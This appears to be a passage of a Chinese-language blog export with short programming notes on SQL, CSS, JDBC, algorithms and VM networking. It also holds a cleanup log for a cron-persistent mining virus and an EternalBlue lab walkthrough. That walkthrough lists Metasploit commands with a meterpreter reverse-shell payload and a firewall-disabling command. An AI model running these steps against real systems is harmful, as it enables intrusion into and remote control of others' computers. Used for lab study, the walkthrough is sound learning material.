class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Mysql在表的某一位置增加一列的命令</span><br><span class="line"> 如果想在一个已经建好的表中添加一列，可以用诸如：</span><br><span class="line"> alter table t1 add column addr varchar(20) not null;</span><br><span class="line"></span><br><span class="line"> 这条语句会向已有的表t1中加入一列addr，这一列在表的最后一列位置。如果我们希望添加在指定的一列，可以用：</span><br><span class="line"> alter table t1 add column addr varchar(20) not null after user1;</span><br><span class="line"></span><br><span class="line"> 注意，上面这个命令的意思是说添加addr列到user1这一列后面。如果想添加到第一列的话，可以用：</span><br><span class="line"> alter table t1 add column addr varchar(20) not null first;</span><br></pre></td></tr></table></figure>

<h3 id="语句执行顺序"><a href="#语句执行顺序" class="headerlink" title="语句执行顺序"></a>语句执行顺序</h3><p><img src="https://i.loli.net/2021/10/24/2oOPsryxkp1XGlZ.png" alt="image-20211024153315160"></p>
]]></content>
      <tags>
        <tag>数据库</tag>
        <tag>sql语句</tag>
      </tags>
  </entry>
  <entry>
    <title>常用CSS属性</title>
    <url>/2023/05/29/%E5%B8%B8%E7%94%A8CSS%E5%B1%9E%E6%80%A7/</url>
    <content><![CDATA[<h2 id="常用CSS属性"><a href="#常用CSS属性" class="headerlink" title="常用CSS属性"></a>常用CSS属性</h2><span id="more"></span>

<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span>.分界线</span><br><span class="line"><span class="attribute">border-bottom</span>: </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="number">2</span>.边框阴影</span><br><span class="line">box-shadow: <span class="number">0</span> <span class="number">0</span> <span class="number">20px</span> <span class="number">2px</span> <span class="number">#BEBCBC</span>FF;</span><br><span class="line"></span><br><span class="line"><span class="number">3</span>.颜色（淡灰色和白色，常用于背景颜色的对比）</span><br><span class="line"><span class="selector-id">#f5f7fa</span></span><br><span class="line"><span class="selector-id">#fff</span></span><br><span class="line"></span><br><span class="line"><span class="number">4</span>.文本指定条件省略号显示</span><br><span class="line"><span class="attribute">overflow-y</span>: hidden;</span><br><span class="line"><span class="attribute">display</span>: -webkit-box; <span class="comment">/*根据不同标签display，有的不用加。或者设置成别的属性，自己可以随便试试*/</span></span><br><span class="line">-webkit-box-orient: vertical;</span><br><span class="line"><span class="attribute">text-overflow</span>: ellipsis; <span class="comment">/*文字超出部分以省略号显示*/</span></span><br><span class="line">-webkit-line-clamp: <span class="number">2</span>; <span class="comment">/*这里就是设置超出几行隐藏*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="number">5</span><span class="selector-class">.div</span>的子标签在<span class="selector-tag">div</span>中居中对齐（前提没有其他布局模式生效）</span><br><span class="line"><span class="attribute">text-align</span>:center</span><br><span class="line"></span><br><span class="line"><span class="number">6</span>.全局居中</span><br><span class="line">position: fixed;</span><br><span class="line"><span class="attribute">top</span>: <span class="number">50%</span>;</span><br><span class="line"><span class="attribute">left</span>: <span class="number">50%</span>;</span><br><span class="line"><span class="attribute">transform</span>: <span class="built_in">translateX</span>(-<span class="number">50%</span>) <span class="built_in">translateY</span>(-<span class="number">50%</span>);</span><br><span class="line"></span><br><span class="line"><span class="number">7</span>.列表滚动显示</span><br><span class="line"><span class="attribute">overflow</span>:scroll; <span class="comment">/*内容会被修剪，但是浏览器会显示滚动条以便查看其余的内容。或者overflow:auto;*/</span></span><br><span class="line"></span><br><span class="line"><span class="attribute">overflow</span>:visible; <span class="comment">/*默认值。内容不会被修剪，会呈现在元素框之外。*/</span></span><br><span class="line"><span class="attribute">overflow</span>:hidden; <span class="comment">/*内容会被修剪，并且其余内容是不可见的。*/</span></span><br><span class="line"><span class="attribute">overflow</span>:scroll; <span class="comment">/*内容会被修剪，但是浏览器会显示滚动条以便查看其余的内容。*/</span></span><br><span class="line"><span class="attribute">overflow</span>:auto; <span class="comment">/*如果内容被修剪，则浏览器会显示滚动条以便查看其余的内容。*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="number">8</span>.模态框</span><br><span class="line"><span class="selector-class">.mask</span> &#123;</span><br><span class="line">  <span class="attribute">position</span>: fixed;</span><br><span class="line">  <span class="attribute">z-index</span>: <span class="number">1</span>;</span><br><span class="line">  <span class="attribute">left</span>: <span class="number">0</span>;</span><br><span class="line">  <span class="attribute">top</span>: <span class="number">0</span>;</span><br><span class="line">  <span class="attribute">width</span>: <span class="number">100vw</span>;</span><br><span class="line">  <span class="attribute">height</span>: <span class="number">100vh</span>;</span><br><span class="line">  <span class="attribute">opacity</span>: .<span class="number">5</span>;</span><br><span class="line">  <span class="attribute">background</span>: <span class="number">#f2f2f2</span>;</span><br><span class="line">  <span class="attribute">background-repeat</span>: no-repeat;</span><br><span class="line">  <span class="attribute">background-size</span>: cover;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.mapAndInfo</span> &#123;</span><br><span class="line">  <span class="attribute">position</span>: fixed;</span><br><span class="line">  <span class="attribute">top</span>: <span class="number">50%</span>;</span><br><span class="line">  <span class="attribute">left</span>: <span class="number">50%</span>;</span><br><span class="line">  <span class="attribute">transform</span>: <span class="built_in">translateX</span>(-<span class="number">50%</span>) <span class="built_in">translateY</span>(-<span class="number">50%</span>);</span><br><span class="line">  <span class="attribute">z-index</span>: <span class="number">2</span>;</span><br><span class="line">  <span class="attribute">width</span>: <span class="number">1300px</span>;</span><br><span class="line">  <span class="attribute">height</span>: <span class="number">750px</span>;</span><br><span class="line">  <span class="attribute">border-radius</span>: <span class="number">10px</span>;</span><br><span class="line">  <span class="attribute">box-shadow</span>: <span class="number">0</span> <span class="number">0</span> <span class="number">20px</span> <span class="number">2px</span> <span class="number">#BEBCBC</span>FF;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="number">9</span>.操作数组</span><br><span class="line">push(item1) 将一个、多个加到末尾，返回新长度。修改原有数组</span><br><span class="line">splice(start, deleteCount <span class="selector-attr">[,item1,…]</span>)	 start 后面deleteCount个元素被删除（含第 start 位）。若只删除了一个，则返回只包含一个元素的数组。若没有删除元素，则返回空数组。此方法修改原数组。</span><br><span class="line"></span><br></pre></td></tr></table></figure>

]]></content>
      <tags>
        <tag>前端</tag>
      </tags>
  </entry>
  <entry>
    <title>数据库驱动、jdbc、mybatis、数据源四者的关系</title>
    <url>/2022/04/26/%E6%95%B0%E6%8D%AE%E5%BA%93%E9%A9%B1%E5%8A%A8%E3%80%81jdbc%E3%80%81mybatis%E3%80%81%E6%95%B0%E6%8D%AE%E6%BA%90%E5%9B%9B%E8%80%85%E7%9A%84%E5%85%B3%E7%B3%BB/</url>
    <content><![CDATA[<h2 id="四者关系，一图见之"><a href="#四者关系，一图见之" class="headerlink" title="四者关系，一图见之"></a>四者关系，一图见之</h2><span id="more"></span>

<p><img src="https://s2.loli.net/2022/04/26/Due6T3QvZ2z5WOI.png" alt="未命名绘图.drawio"></p>
<p><strong>略加解释：</strong></p>
<p>1、连接不同的数据库需要使用不同的数据库驱动（数据库驱动）</p>
<p>2、jdbc本质上就是提供了一组规范的api、并且通过数据库驱动，连接的数据库（JDBC、数据库驱动）</p>
<p>3.1、mybatis可以视为jdbc封装起来的一个组件，拥有很多jdbc不具备的优点（JDBC、mybatis）<br>3.2、Mybatis能集成第三方的数据源组件，自身也提供了数据源的实现（mybatis、数据源）</p>
<p>4.1、数据源也是通过数据库驱动，连接到的数据库（数据源、数据驱动）<br>4.2、数据源本质上就是为了解决资源浪费的问题</p>
]]></content>
      <tags>
        <tag>数据库</tag>
      </tags>
  </entry>
  <entry>
    <title>最大公约数——欧几里得辗转相除法</title>
    <url>/2023/03/06/%E6%9C%80%E5%A4%A7%E5%85%AC%E7%BA%A6%E6%95%B0%E2%80%94%E2%80%94%E6%AC%A7%E5%87%A0%E9%87%8C%E5%BE%97%E8%BE%97%E8%BD%AC%E7%9B%B8%E9%99%A4%E6%B3%95/</url>
    <content><![CDATA[<h2 id="欧几里得——辗转相除法"><a href="#欧几里得——辗转相除法" class="headerlink" title="欧几里得——辗转相除法"></a>欧几里得——辗转相除法</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">while</span> (b != <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="keyword">int</span> tem = a % b;</span><br><span class="line">    a = b;</span><br><span class="line">    b = tem;</span><br><span class="line">&#125;</span><br><span class="line">System.out.println(<span class="string">&quot;a和b的最大公约数为：&quot;</span> + a);</span><br></pre></td></tr></table></figure>

]]></content>
      <tags>
        <tag>算法</tag>
      </tags>
  </entry>
  <entry>
    <title>爬取网站常见错误</title>
    <url>/2023/05/29/%E7%88%AC%E5%8F%96%E7%BD%91%E7%AB%99%E5%B8%B8%E8%A7%81%E9%94%99%E8%AF%AF/</url>
    <content><![CDATA[<h2 id="爬虫常见错误"><a href="#爬虫常见错误" class="headerlink" title="爬虫常见错误"></a>爬虫常见错误</h2><span id="more"></span>

<ol>
<li><p>url构造出错</p>
</li>
<li><p>referer中的一些参数有必要和url中的参数一样，需要动态变化</p>
</li>
<li><p>返回响应数据中，需要的数据不存在（越界，为空，获取到链接但网络资源不存在从而抛出异常）</p>
</li>
<li><p>解析数据，格式错误</p>
</li>
<li><p>存储数据库时，id（主键）错误、重复</p>
</li>
<li><p>在post请求，进入开发者工具，找到请求连接，最好找最后一次的请求链接，否则（使用最后一次之前的请求链接中的负载参数）可能所获得的响应中不包含全部的数据（即不完整）</p>
</li>
</ol>
]]></content>
      <tags>
        <tag>爬虫</tag>
      </tags>
  </entry>
  <entry>
    <title>约瑟夫问题——坏人必须死</title>
    <url>/2021/05/27/%E7%BA%A6%E7%91%9F%E5%A4%AB%E9%97%AE%E9%A2%98%E2%80%94%E2%80%94%E5%9D%8F%E4%BA%BA%E5%BF%85%E9%A1%BB%E6%AD%BB/</url>
    <content><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><span id="more"></span>

<img src="https://i.loli.net/2021/05/27/u1ylWdAFIU2B8jb.png" alt="Image.png" style="zoom: 67%;" />

<h2 id="题意理解"><a href="#题意理解" class="headerlink" title="题意理解"></a>题意理解</h2><p>经思考，发现可以这么理解题意：有2m个人，然后进行报数，相当于前一个数字加上k，若结果大于m且小于等于2m，则为坏人，则需要总人数-1，即坏人还剩m-1人；若出现结果大于等于1且小于等于m的，则该k值不符合需求，需要将k++。直至坏人总数为0。</p>
<ol>
<li>需要注意的是，在不断地取余过程中，会出现0这个数，所以，我们最好用0来代替2m的意思</li>
<li>此外，需要特别注意的有一点，就是每次加上k进行取余的过程中，需要注意原先位置是不是0，若是，则不许奥倒退（即减一），否则需要先倒退（即减一）后再进行取余，计算下一个位置</li>
</ol>
<h2 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h2><pre><code>#include &lt;stdio.h&gt;

int main() &#123;
int m, n, k, rest, pos;
while (scanf(&quot;%d&quot;, &amp;m) != EOF) &#123;
    n = m * 2;
    rest = m;
    k = m;
    pos = k % n;
    while (rest != 0) &#123;
        rest = m;
        n = m * 2;
        k++;
        pos = k % n;
        while (pos &gt; m &amp;&amp; pos &lt; n || (pos == 0 &amp;&amp; rest != 0)) &#123;
            n--;
            rest--;
            //
            if (pos == 0) &#123;        /*此情况易忽略*/
                pos = (pos + k) % n;
            &#125;
            else &#123;
                pos = (pos - 1 + k) % n;
            &#125;
            //
            //pos = (pos - 1 + k) % n;    /*很容易写成这个情况*/
        &#125;
    &#125;
    printf(&quot;%d\n&quot;, k);
&#125;
return 0;
&#125;
</code></pre>
]]></content>
      <tags>
        <tag>算法</tag>
        <tag>约瑟夫问题</tag>
      </tags>
  </entry>
  <entry>
    <title>服务器一直100%负载、CPU100%使用率</title>
    <url>/2023/01/09/%E6%9C%8D%E5%8A%A1%E5%99%A8%E4%B8%80%E7%9B%B4100-%E8%B4%9F%E8%BD%BD%E3%80%81CPU100-%E4%BD%BF%E7%94%A8%E7%8E%87/</url>
    <content><![CDATA[<h2 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h2><span id="more"></span>

<blockquote>
<p>远程连接服务器，执行命令速度明显慢到离谱。通过宝塔，发现<strong>负载状态和CPU使用率都跑到了100%</strong></p>
</blockquote>
<h2 id="原因"><a href="#原因" class="headerlink" title="原因"></a>原因</h2><h3 id="挖矿病毒"><a href="#挖矿病毒" class="headerlink" title="挖矿病毒"></a>挖矿病毒</h3><p>经过查找分析，是一个叫做<code>zzh</code>的<strong>挖矿病毒</strong>导致的。</p>
<h3 id="Redis未授权"><a href="#Redis未授权" class="headerlink" title="Redis未授权"></a>Redis未授权</h3><p>这个病毒是哪里来的呢？</p>
<p>后来查找分析，知道这个病毒是因为Redis一开始没有设置登录密码导致的。具体漏洞网上是这么说的：</p>
<p><a href="https://imgse.com/i/pSZypfe"><img src="https://s1.ax1x.com/2023/01/09/pSZypfe.png" alt="pSZypfe.png"></a></p>
<h2 id="解决"><a href="#解决" class="headerlink" title="解决"></a>解决</h2><ol>
<li><p>首先想到的是通过<code>ps -ef</code>或者<code>top</code>查找资源占用率异常的进程（结果失败，因为这两条命令查不出来）</p>
<blockquote>
<p>注：top虽然也查不出来，但是可以发现us占到了90+%，这明显不正常</p>
</blockquote>
</li>
<li><p>使用<code>htop</code>命令查找，如果没有这条命令，需要安装一下：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">yum -y install epel-release</span><br><span class="line">yum -y install htop</span><br></pre></td></tr></table></figure></li>
<li><p>首先发现前两行跑满了，变成了红色。然后下面的进程列表也可以看到有几个<code>zzh</code>的进程占满了资源<br><a href="https://imgse.com/i/pSZyCSH"><img src="https://s1.ax1x.com/2023/01/09/pSZyCSH.png" alt="pSZyCSH.png"></a></p>
</li>
<li><p>使用<code>kill -9 PID号</code>把这几个进程杀死</p>
</li>
<li><p>执行<code>ps -ef | grep newinit</code>，将查到的几个进程也用上一步的命令杀死 </p>
</li>
<li><p>再执行这几条命令（<strong>清除病毒</strong>）</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> /usr/bin</span><br><span class="line">//这一段为了修改chatrr命令的权限</span><br><span class="line">cp chattr chattr.new</span><br><span class="line">chmod a+x chattr.new</span><br><span class="line">chattr.new -i chattr</span><br><span class="line">rm -f chattr.new</span><br><span class="line">chmod a+x chattr</span><br><span class="line"></span><br><span class="line"><span class="built_in">cd</span> /etc</span><br><span class="line">//这一段为了删除zzh文件</span><br><span class="line">chattr -ia zzh	//少了这一步，删除时会提示没有权限</span><br><span class="line">rm -rf zzh </span><br><span class="line">rm -rf zzhs</span><br><span class="line"></span><br><span class="line">//这一段为了删除newinit.sh文件</span><br><span class="line">chattr -ia newinit.sh	//少了这一步，删除时会提示没有权限</span><br><span class="line">rm -rf newinit.sh</span><br></pre></td></tr></table></figure></li>
<li><p>再使用<code>htop</code>命令查看有没有<code>zzh</code>进程了，如果有的话，再使用<code>kill -9 PID号</code>杀死进程</p>
</li>
<li><p>同样对第5步中<code>newinit.sh</code>进程也再检查一次，操作同第7步</p>
</li>
</ol>
<h2 id="遗留问题"><a href="#遗留问题" class="headerlink" title="遗留问题"></a>遗留问题</h2><p>经过上述步骤，通过宝塔可以发现已经没有恶意程序占用资源了</p>
<p>但是出于想要彻底清除病毒的目的，我又通过<code>find / -name zzh</code>命令发现还存在<code>/etc/cron.d/zzh</code>文件，也就是说定时任务中还有这个文件，通过<code>vim</code>编辑，发现里面也就一行命令<code>*/50 * * * * sh /etc/newinit.sh &gt;/dev/null 2&gt;&amp;1</code>。（这个文件我想删除，但是怎么都删除失败了）</p>
<p>以及通过<code>crontab -e</code>查看当前在执行的定时任务程序，发现也是上述那条命令<code>*/50 * * * * sh /etc/newinit.sh &gt;/dev/null 2&gt;&amp;1</code>，输入<code>dd</code>命令，用<code>wq!</code>也保存不了。这个命令内容其实存储在<code>/var/spool/cron/用户名</code>文件中，但是这个文件也不能通过<code>chmod</code>修改读写权限</p>
<p>所以，虽然解决了负载和CPU资源占用问题，但是这个病毒搞的定时任务感觉并没有彻底清除。</p>
]]></content>
      <tags>
        <tag>Linux</tag>
        <tag>服务器</tag>
      </tags>
  </entry>
  <entry>
    <title>虚拟机中网络配置</title>
    <url>/2022/05/03/%E8%99%9A%E6%8B%9F%E6%9C%BA%E4%B8%AD%E7%BD%91%E7%BB%9C%E9%85%8D%E7%BD%AE/</url>
    <content><![CDATA[<h2 id="三种连接模式"><a href="#三种连接模式" class="headerlink" title="三种连接模式"></a>三种连接模式</h2><span id="more"></span>

<h3 id="模式介绍"><a href="#模式介绍" class="headerlink" title="模式介绍"></a>模式介绍</h3><ul>
<li><strong>桥接模式：</strong>桥接模式就是将主机网卡与虚拟机虚拟的网卡利用虚拟网桥进行通信。在桥接的作用下，类似于把物理主机虚拟为一个交换机，所有桥接设置的虚拟机连接到这个交换机的一个接口上，物理主机也同样插在这个交换机当中，所以所有桥接下的网卡与网卡都是交换模式的，相互可以访问而不干扰。在桥接模式下，虚拟机ip地址需要与主机在同一个网段，如果需要联网，则网关与DNS需要与主机网卡一致。<br>如果需要远程连接（需要虚拟机的IP地址）时，需要知道或者自定义设置一下虚拟机的ip地址，网关，dns等（不要设置为自动识别的）</li>
<li><strong>Net模式：</strong>NAT模式是比较简单的实现虚拟机上网的方式，NAT模式的虚拟机就是通过宿主机（物理电脑）上网和交换数据的。如果你的网络ip资源紧缺，但是你又希望你的虚拟机能够联网，这时候NAT模式是最好的选择。NAT模式借助虚拟NAT设备和虚拟DHCP服务器，使得虚拟机可以联网</li>
<li><strong>仅主机模式：</strong>（还没有研究）</li>
</ul>
<h3 id="配置方法"><a href="#配置方法" class="headerlink" title="配置方法"></a>配置方法</h3><ol>
<li><strong>配置虚拟网卡：</strong>在虚拟网络编辑器中，需要有自己需要用到的虚拟网卡，其中VMnet0一般就是桥接模式的网卡，另外两种见名知意。如果没有VMnet0，可以 更改设置–&gt;还原默认设置–&gt;确定，然后就有了。（有时候桥接模式可能还需要指定桥接至主机中的哪一个具体网卡）<br><img src="https://gitee.com/mushroom_man/imgs/raw/master/img/image-20220503140513670.png" alt="image-20220503140513670"></li>
<li><strong>虚拟机选择连接模式：</strong><br><img src="https://gitee.com/mushroom_man/imgs/raw/master/img/image-20220503141011124.png" alt="image-20220503141011124"></li>
<li>然后在虚拟机中开始使用<strong>有线连接网络</strong>或者<strong>无线连接网络</strong>，就可以上网了。</li>
</ol>
<h2 id="连接网络方式"><a href="#连接网络方式" class="headerlink" title="连接网络方式"></a>连接网络方式</h2><h3 id="使用有线连接"><a href="#使用有线连接" class="headerlink" title="使用有线连接"></a>使用有线连接</h3><p>如果使用有线连接，可能会出现一些问题，有些路由器出于安全考虑，在使用桥接模式的时候，并不会分配给虚拟机一个ip，导致无法成功连接上网络（例如校园wife路由器）（但是例如个人热点就可以使用桥接模式下的有线连接方式）。</p>
<p>如果就想用桥接模式连接校园wife，也不是不可以，方法就是使用无线连接。</p>
<h3 id="使用无线连接"><a href="#使用无线连接" class="headerlink" title="使用无线连接"></a>使用无线连接</h3><p>需要一个外接网卡</p>
<ol>
<li><p>查看虚拟机与网卡USB接口的兼容性</p>
<p><img src="https://gitee.com/mushroom_man/imgs/raw/master/img/image-20220503133346748.png" alt="image-20220503133346748"></p>
</li>
<li><p>让自己的虚拟机兼容外接网卡的接口类型<br><img src="https://gitee.com/mushroom_man/imgs/raw/master/img/image-20220503133459046.png" alt="image-20220503133459046"></p>
</li>
<li><p>切断外接网卡与主机的连接，连接虚拟机<br><img src="https://gitee.com/mushroom_man/imgs/raw/master/img/image-20220503133658889.png" alt="image-20220503133658889"></p>
</li>
<li><p>连接wife，开始冲浪！</p>
</li>
</ol>
]]></content>
      <tags>
        <tag>虚拟机</tag>
      </tags>
  </entry>
  <entry>
    <title>背包算法</title>
    <url>/2021/05/27/%E8%83%8C%E5%8C%85%E7%AE%97%E6%B3%95/</url>
    <content><![CDATA[<h2 id="例题分析-gt-共同特性（理解重点）"><a href="#例题分析-gt-共同特性（理解重点）" class="headerlink" title="例题分析-&gt;共同特性（理解重点）"></a>例题分析-&gt;共同特性（理解重点）</h2><span id="more"></span>

<blockquote>
<p>有N件物品和一个容量为V的背包，第i件物品的费用是value[i]，价值是weight[i]，求解将哪些物品装入背包可使这些物品的费用总和不超过背包容量，且价值总和最大？</p>
</blockquote>
<p>经过分析，我总结出，这一类的问题都有一下<strong>共同特点</strong>（<strong>都能分析出三个值：“最大量”、“属性1”、“属性2”</strong>）：</p>
<ol>
<li><p>有一个<strong>最大量</strong>，本题中这个最大限制量是<strong>容量</strong>（当然也可以是其他量，比如说我还碰到的“体力值”）（而有时候这个最大量是隐性给出，就是物体的个数）</p>
</li>
<li><p>进行操作的每一个单位有<strong>两个属性值</strong>，本题中分别是<strong>重量</strong>和<strong>价值</strong></p>
</li>
<li><p>2中所提及到的两个属性值，一个是用来和<strong>最大量</strong>进行比较，从而确定选取方案；另一个属性值是用来<strong>获取最值</strong>，比如说本题中的“价值总和最大”（这个属性值有时候是隐性给出的，例如只给出第一个属性，第二个属性值每一个物体默认是一样的）</p>
</li>
</ol>
<h2 id="通用的基础公式（理解重点）"><a href="#通用的基础公式（理解重点）" class="headerlink" title="通用的基础公式（理解重点）"></a>通用的基础公式（理解重点）</h2><p>定义**dp[i][j]**：表示前i个物品，在容量为j的时候，最佳方案所能得到的最大总价值。</p>
<ol>
<li><strong>约束条件：</strong>weight[x1]+weight[x2]+…… &lt; j（同时j&lt;=V，该条件可以用来作为循环遍历的约束条件）</li>
<li><strong>通项公式：</strong><blockquote>
<p>**dp[i][j] = dp[i-1][j]**，weight[i] &gt; j时，</p>
<p>**dp[i][j] = max{dp[i-1][j]，dp[i-1][j-weight[i] + value[i]}**，j &gt;= weight[i]时</p>
</blockquote>
</li>
</ol>
<h3 id="dp二维数组如下："><a href="#dp二维数组如下：" class="headerlink" title="dp二维数组如下："></a>dp二维数组如下：</h3>]]></content>
      <tags>
        <tag>算法</tag>
        <tag>背包问题</tag>
      </tags>
  </entry>
  <entry>
    <title>虚拟机之间的入侵——永恒之蓝</title>
    <url>/2021/05/23/%E8%99%9A%E6%8B%9F%E6%9C%BA%E4%B9%8B%E9%97%B4%E7%9A%84%E5%85%A5%E4%BE%B5%E2%80%94%E2%80%94%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D/</url>
    <content><![CDATA[<h2 id="永恒之蓝"><a href="#永恒之蓝" class="headerlink" title="永恒之蓝"></a>永恒之蓝</h2><span id="more"></span>

<p>1.进入虚拟机，查看两台虚拟机的IP地址，输入命令行如下：<br>    <code>ifconfig</code>  //这是在kali虚拟机中查看IP地址的命令<br><strong>效果如下图所示</strong><br><img src="https://i.loli.net/2021/05/23/1GTF679moSNYIL5.png" alt="屏幕截图 2021-05-23 175940.png"></p>
<pre><code>`ipconfig`  //这是在Windows中的查看IP地址的命令
</code></pre>
<p><strong>效果如图</strong><br><img src="https://i.loli.net/2021/05/23/mKGT52szxED4j6C.png" alt="1.png"></p>
<p>2.在kali虚拟集中依次输入如下命令：<br>    msfconsole                //打开”美少妇”）<br>    use exploit/multi/handler<br>    use exploit/windows/smb/ms17_010_eternalblue<br>    set payload windows/x64/meterpreter/reverse_tcp<br>    set RHOST 192.168.<em>.</em>      //（目标机的IP地址）<br>    run<br><strong>效果如图所示即表示成功</strong><br><img src="https://i.loli.net/2021/05/23/mvCJyDIMUHRo8pb.png" alt="屏幕截图 2021-05-23 204741.png"></p>
<blockquote>
<p>如若失败，则可能需要对目标虚拟机进行以下操作<br> 使用管理员省份打开cmd，输入以下代码</p>
<p><code>netsh advfirewall set allprofiles state off</code></p>
<p><strong>效果应该如图所示，出现“确定”即为成功</strong><br><img src="https://i.loli.net/2021/05/23/Fzc4wAVqdGKS1bZ.png" alt="屏幕截图 2021-05-23 205802.png"></p>
</blockquote>
<p>3.举例：控制对方的电脑截个屏，并获取照片<br>    screenshot        //截屏<br><img src="https://i.loli.net/2021/05/23/nlOxuUZqJvpBANT.png" alt="屏幕截图 2021-05-23 210457.png"></p>
<p>图片文件保存的路径在命令行中显示的地址处，如下：<br><img src="https://i.loli.net/2021/05/23/cAqGLFyilZboErQ.png" alt="屏幕截图 2021-05-23 210920.png"></p>
]]></content>
  </entry>
  <entry>
    <title>解决spring中Get、Post请求出现的乱码</title>
    <url>/2021/11/15/%E8%A7%A3%E5%86%B3spring%E4%B8%ADGet%E3%80%81Post%E8%AF%B7%E6%B1%82%E5%87%BA%E7%8E%B0%E7%9A%84%E4%B9%B1%E7%A0%81/</url>
    <content><![CDATA[<h2 id="Spring的Get、POST请求的中文乱吗"><a href="#Spring的Get、POST请求的中文乱吗" class="headerlink" title="Spring的Get、POST请求的中文乱吗"></a>Spring的Get、POST请求的中文乱吗</h2><span id="more"></span>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.lry.filter;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.*;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequestWrapper;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.UnsupportedEncodingException;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 解决get和post请求 全部乱码的过滤器</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">GenericEncodingFilter</span> <span class="keyword">implements</span> <span class="title">Filter</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">destroy</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">doFilter</span><span class="params">(ServletRequest request, ServletResponse response, FilterChain chain)</span> <span class="keyword">throws</span> IOException, ServletException </span>&#123;</span><br><span class="line">        <span class="comment">//处理response的字符编码</span></span><br><span class="line">        HttpServletResponse myResponse=(HttpServletResponse) response;</span><br><span class="line">        myResponse.setContentType(<span class="string">&quot;text/html;charset=UTF-8&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 转型为与协议相关对象</span></span><br><span class="line">        HttpServletRequest httpServletRequest = (HttpServletRequest) request;</span><br><span class="line">        <span class="comment">// 对request包装增强</span></span><br><span class="line">        HttpServletRequest myrequest = <span class="keyword">new</span> MyRequest(httpServletRequest);</span><br><span class="line">        chain.doFilter(myrequest, response);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">init</span><span class="params">(FilterConfig filterConfig)</span> <span class="keyword">throws</span> ServletException </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//自定义request对象，HttpServletRequest的包装类</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyRequest</span> <span class="keyword">extends</span> <span class="title">HttpServletRequestWrapper</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> HttpServletRequest request;</span><br><span class="line">    <span class="comment">//是否编码的标记</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">boolean</span> hasEncode;</span><br><span class="line">    <span class="comment">//定义一个可以传入HttpServletRequest对象的构造函数，以便对其进行装饰</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">MyRequest</span><span class="params">(HttpServletRequest request)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>(request);<span class="comment">// super必须写</span></span><br><span class="line">        <span class="keyword">this</span>.request = request;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 对需要增强方法 进行覆盖</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Map <span class="title">getParameterMap</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="comment">// 先获得请求方式</span></span><br><span class="line">        String method = request.getMethod();</span><br><span class="line">        <span class="keyword">if</span> (method.equalsIgnoreCase(<span class="string">&quot;post&quot;</span>)) &#123;</span><br><span class="line">            <span class="comment">// post请求</span></span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="comment">// 处理post乱码</span></span><br><span class="line">                request.setCharacterEncoding(<span class="string">&quot;utf-8&quot;</span>);</span><br><span class="line">                <span class="keyword">return</span> request.getParameterMap();</span><br><span class="line">            &#125; <span class="keyword">catch</span> (UnsupportedEncodingException e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (method.equalsIgnoreCase(<span class="string">&quot;get&quot;</span>)) &#123;</span><br><span class="line">            <span class="comment">// get请求</span></span><br><span class="line">            Map&lt;String, String[]&gt; parameterMap = request.getParameterMap();</span><br><span class="line">            <span class="keyword">if</span> (!hasEncode) &#123; <span class="comment">// 确保get手动编码逻辑只运行一次</span></span><br><span class="line">                <span class="keyword">for</span> (String parameterName : parameterMap.keySet()) &#123;</span><br><span class="line">                    String[] values = parameterMap.get(parameterName);</span><br><span class="line">                    <span class="keyword">if</span> (values != <span 